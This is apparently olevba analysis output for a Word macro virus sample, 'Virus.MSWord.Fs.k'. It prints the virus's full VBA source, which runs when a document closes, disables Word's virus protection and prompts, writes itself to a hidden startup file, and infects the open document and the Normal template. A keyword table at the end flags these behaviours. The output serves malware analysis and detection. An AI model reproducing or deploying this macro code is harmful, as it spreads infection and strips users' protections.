olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.k-1963a989bbe42a4d95e63eae4381b1a144d59c76
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.k-1963a989bbe42a4d95e63eae4381b1a144d59c76 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Quote
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
WordBasic.DisableAutoMacros 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Łd = Application.StartupPath & "\Mscreate.dir"
If GetAttr(Łd) <> 34 Then SetAttr Łd, 0: VBProject.VBComponents(1).Export Łd: SetAttr Łd, 34
With ActiveDocument.VBProject
If .HelpContextID <> 1 Then _
.HelpContextID = 1: _
.VBComponents(1).CodeModule.AddFromFile Łd: _
.VBComponents(1).CodeModule.DeleteLines 1, 4
End With
With NormalTemplate.VBProject
If .HelpContextID <> 1 Then _
.HelpContextID = 1: _
.VBComponents(1).CodeModule.AddFromFile Łd: _
.VBComponents(1).CodeModule.DeleteLines 1, 4
End With
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

